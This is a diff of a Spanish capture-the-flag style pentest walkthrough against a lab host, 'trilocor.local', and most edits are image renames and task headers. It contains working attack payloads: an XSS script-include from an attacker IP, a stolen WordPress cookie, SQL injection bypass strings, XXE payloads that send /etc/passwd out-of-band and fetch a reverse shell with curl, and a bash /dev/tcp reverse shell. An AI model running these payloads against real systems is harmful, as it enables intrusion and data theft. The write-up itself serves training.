@@ -19,7 +19,7 @@ ffuf -c -u http://trilocor.local/ -H 'Host: FUZZ.trilocor.local' -w /usr/share/w
 * www
 * admin
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 > No olvidar poner en /etc/hosts la IP con los subdominios&#x20;
 
@@ -95,7 +95,7 @@ sudo php -S 0.0.0.0:8000
 "><script src="http://TU_IP:8000/malicious.js"></script>
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1776066952%7CvL8Halvch4Sh2xreFf4KreSwfKr8WAdJdDXwbuUT0PD%7C2fdd857041823138af2efb18ac89684d797ce25388bb16b9d5fe966c1cc8397a;%20wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1776066952%7CvL8Halvch4Sh2xreFf4KreSwfKr8WAdJdDXwbuUT0PD%7Cd93128f07913a3bd07fed6d0fc4c70b11a080e9d53662d388a9747c9a18805e2;%20wordpress_test_cookie=WP%20Cookie%20check
@@ -103,9 +103,11 @@ wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1776066952%7CvL8Halvch4S
 
 Añadir en inspeccionar en cookies esos valores.
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+### task 1
+
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 COOKIES
 
@@ -175,6 +177,8 @@ nc -lnvp 1234
 ```
 
 Vamos al directorio **/var/www/html**. En wp-config.php está la contraseña con la que entramos en la base de datos.
+
+### task 2
 
 <figure><img src="../.gitbook/assets/image (1742).png" alt=""><figcaption></figcaption></figure>
 
@@ -247,9 +251,11 @@ GET /index.php?username=%27or+%271%27%3D%271%27--+-&password=%27or+%271%27%3D%27
 http://trilocor.local:8088/index.php?username=%27or+%271%27%3D%271%27--+-&password=%27or+%271%27%3D%271%27--+-
 ```
 
+### task 3
+
 <figure><img src="../.gitbook/assets/image (1741).png" alt=""><figcaption></figcaption></figure>
 
-### Public Relations PR (8009)
+### Public Relations PR (8009) -> task 8
 
 <div><figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 104947.png" alt=""><figcaption></figcaption></figure> <figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 104928.png" alt=""><figcaption></figcaption></figure></div>
 
@@ -264,8 +270,64 @@ Entramos en el **/admin** y reutilizamos las credenciales.
 Se crea el archivo **xxe.dtd**.
 
 ```
-<!ENTITY % file SYSTEM "php:-/filter/convert.base64-
-encode/resource=/etc/passwd">
-<!ENTITY % oob "<!ENTITY content SYSTEM 'http:-/10.10.14.223:8004/?
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.223:8004/?
 content=%file;'>">
 ```
+
+ahora en el atacante un index.php
+
+```
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+
+Se construyó un archivo SVG que referencia el DTD remoto y&#x20;fuerza la resolución de entidades
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE testing [ 
+    <!ENTITY % remote SYSTEM "http://10.10.14.223:8004/xxe.dtd">
+    %remote;
+    %oob;
+]>
+<svg>&content;/svg>
+```
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+decodificamos
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+creamos una rev shell y la subimos&#x20;
+
+```
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE testing [ <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'10.10.14.223:8004/revshell.php'" > ]>
+<svg xmlns="http:-/wwww.w3.org/2000/svg" width="200" height="200" 
+version="1.1">
+<text>&xxe;</text>
+</svg>
+```
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+se verifica el RCE
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+vale hacemos la reverse shell
+
+```
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.223%2F1234%200%3E%261%22
+```
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
